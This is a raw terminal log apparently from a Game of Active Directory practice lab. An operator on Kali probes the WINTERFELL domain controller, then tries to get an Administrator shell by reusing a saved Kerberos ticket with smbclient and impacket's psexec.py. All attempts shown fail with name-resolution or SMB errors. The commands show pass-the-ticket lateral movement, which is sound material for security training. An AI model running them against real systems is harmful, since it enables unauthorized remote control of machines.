└─$ ping WINTERFELL.north.sevenkingdoms.local  
PING WINTERFELL.north.sevenkingdoms.local (192.168.20.11) 56(84) bytes of data.  
64 bytes from WINTERFELL.north.sevenkingdoms.local (192.168.20.11): icmp\_seq=1 ttl=127 time=21.3 ms  
64 bytes from WINTERFELL.north.sevenkingdoms.local (192.168.20.11): icmp\_seq=2 ttl=127 time=17.0 ms  
64 bytes from WINTERFELL.north.sevenkingdoms.local (192.168.20.11): icmp\_seq=3 ttl=127 time=16.1 ms  
64 bytes from WINTERFELL.north.sevenkingdoms.local (192.168.20.11): icmp\_seq=4 ttl=127 time=16.8 ms  
64 bytes from WINTERFELL.north.sevenkingdoms.local (192.168.20.11): icmp\_seq=5 ttl=127 time=21.7 ms  
^C  
\--- WINTERFELL.north.sevenkingdoms.local ping statistics \---  
5 packets transmitted, 5 received, 0% packet loss, time 4005ms  
rtt min/avg/max/mdev \= 16.129/18.610/21.748/2.410 ms  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nc \-vv WINTERFELL.north.sevenkingdoms.local 88  
WINTERFELL.north.sevenkingdoms.local \[192.168.20.11\] 88 (kerberos) open  
^C sent 0, rcvd 0  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ host north.sevenkingdoms.local       
;; communications error to 127.0.0.1\#53: connection refused  
;; communications error to 127.0.0.1\#53: connection refused  
Host north.sevenkingdoms.local not found: 3(NXDOMAIN)  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-k //WINTERFELL.north.sevenkingdoms.local/C$ \-U Administrator  
WARNING: The option \-k|--kerberos is deprecated\!  
gensec\_spnego\_client\_negTokenInit\_step: Could not find a suitable mechtype in NEG\_TOKEN\_INIT  
session setup failed: NT\_STATUS\_INVALID\_PARAMETER  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ export KRB5CCNAME=$(pwd)/WINTERFELL.north.sevenkingdoms.local.ccache  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ psexec.py \-k \-no-pass north.sevenkingdoms.local/Administrator@WINTERFELL.north.sevenkingdoms.local  
/home/kali/.venvs/cme/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.12.0 \- Copyright Fortra, LLC and its affiliated companies 

\[-\] \[Errno Connection error (NORTH.SEVENKINGDOMS.LOCAL:88)\] \[Errno \-2\] Name or service not known  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ psexec.py \-k \-no-pass north.sevenkingdoms.local/Administrator@WINTERFELL.north.sevenkingdoms.local \-dc-ip 192.168.20.11  
/home/kali/.venvs/cme/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\<81.  
  import pkg\_resources  
Impacket v0.12.0 \- Copyright Fortra, LLC and its affiliated companies 

\[-\] SMB SessionError: code: 0xc0000016 \- STATUS\_MORE\_PROCESSING\_REQUIRED \- {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.  
                                                                                                                                                                  
┌──(cme)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ nc \-vv WINTERFELL.north.sevenkingdoms.local 445  
WINTERFELL.north.sevenkingdoms.local \[192.168.20.11\] 445 (microsoft-ds) open  
^C sent 0, rcvd 0  
                                                                                                                                                                  
